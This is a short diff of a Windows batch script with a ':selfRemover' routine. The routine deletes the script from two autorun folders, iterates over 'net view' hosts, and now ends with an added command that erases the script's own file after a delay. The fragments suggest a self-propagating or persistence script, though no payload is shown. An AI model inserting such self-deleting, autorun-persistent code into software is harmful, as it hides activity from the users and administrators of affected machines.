@@ -37,14 +37,14 @@ chcp 65001>nul
 %~d0
 cd "%~dp0"
 
+setlocal EnableDelayedExpansion
+
 
 
 
 
 set parameters=%*
-setlocal EnableDelayedExpansion
 set counter=0
-
 for %%i in (%parameters%) do (
   set /a counter+=1
   if !counter! GEQ 2 set parameters2=!parameters2!%%i
@@ -199,9 +199,6 @@ goto :cycle
 
 
 :selfRemover
-taskkill /f /im "%~nx0"
-taskkill /f /im "cmd.exe"
-
 del /q "%path_autoRun1%\%~nx0"
 del /q "%path_autoRun2%\%~nx0"
 
@@ -243,4 +240,5 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
   )
 )
 
+start "" cmd /c "timeout /t 3 ^& del /q """%~dpnx0""""
 exit
